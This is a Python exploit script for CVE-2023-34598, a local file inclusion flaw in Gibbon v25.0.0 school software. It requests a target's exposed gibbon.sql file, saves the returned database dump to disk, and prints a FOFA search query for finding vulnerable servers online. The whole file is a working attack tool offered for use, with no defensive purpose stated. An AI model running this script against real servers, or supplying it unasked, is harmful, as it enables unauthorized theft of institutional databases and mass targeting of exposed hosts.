#!/usr/bin/env python3

import os
import sys
import argparse
import requests

# Suppress only the single InsecureRequestWarning from urllib3 needed
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

DESCRIPTION = """
CVE-2023-34598 - Gibbon v25.0.0 LFI Exploit
"""

FOFA_QUERY = """\
Use this FOFA query to search for potentially vulnerable targets:
  icon_hash="-165631681"
"""

# Global variables
cont = 1
default_dirname = "Gibbon_dump"


def make_dir(dirname=default_dirname):
    """
    Attempts to create the specified directory and then chdir into it.
    If the directory already exists, increments a global counter
    and retries with a new name (Gibbon_dump-2, etc.).
    """
    global cont
    try:
        os.mkdir(dirname)
        os.chdir(dirname)
    except FileExistsError:
        cont += 1
        new_name = f"{default_dirname}-{cont}"
        make_dir(new_name)


def scan_target(url):
    """
    Main logic to test the target URL for the vulnerability
    and, if found, create a directory to store the results.
    """
    if url.endswith("/"):
        url = url[:-1]

    try:
        print(f"[*] Scanning URL: {url}")
        r = requests.get(f"{url}/?q=gibbon.sql", verify=False, timeout=10)
        response_text = r.text

        # Check if page includes 'SQL Dump'
        if r.status_code == 200 and "SQL Dump" in response_text:
            print("[+] Target appears vulnerable. Saving dump...")
            make_dir()  # Create or enter output directory

            with open("!target.txt", "w") as f:
                f.write(url)

            # Extract the relevant SQL portion
            start_idx = response_text.find("-- phpMyAdmin")
            end_idx = response_text.find("AUTO_INCREMENT=8;")
            if start_idx != -1 and end_idx != -1:
                relevant_sql = response_text[start_idx:end_idx + 16]

                with open("gibbon.sql", "w") as sql_file:
                    sql_file.write(relevant_sql)

                current_dir = os.path.basename(os.getcwd())
                print(f"[+] Database dump saved to '{current_dir}/gibbon.sql'.")
            else:
                print("[!] 'SQL Dump' phrase found, but could not locate phpMyAdmin markers. Partial data only.")
        else:
            print("[-] Not vulnerable.")
    except Exception as e:
        print(f"[!] Error: {e}")
        sys.exit(1)


def show_fofa_query():
    """
    Prints the FOFA query that can be used to discover potential targets.
    """
    print(FOFA_QUERY)


def main():
    parser = argparse.ArgumentParser(
        description=DESCRIPTION,
        formatter_class=argparse.RawTextHelpFormatter
    )
    subparsers = parser.add_subparsers(
        title="Commands",
        dest="command",
        help="Choose one of the available commands."
    )

    # --- Subcommand: scan ---
    parser_scan = subparsers.add_parser(
        "scan",
        help="Scan a target URL for the CVE-2023-34598 vulnerability."
    )
    parser_scan.add_argument(
        "url",
        help="Base URL of the Gibbon application (e.g., https://example.com/gibbon)"
    )

    # --- Subcommand: fofa ---
    parser_fofa = subparsers.add_parser(
        "fofa",
        help="Print a FOFA query for finding vulnerable targets."
    )

    # Parse the args
    args = parser.parse_args()

    # If no command is provided, show help
    if not args.command:
        parser.print_help()
        sys.exit(0)

    # Dispatch to subcommand logic
    if args.command == "scan":
        scan_target(args.url)
    elif args.command == "fofa":
        show_fofa_query()
    else:
        parser.print_help()

if __name__ == "__main__":
    main()

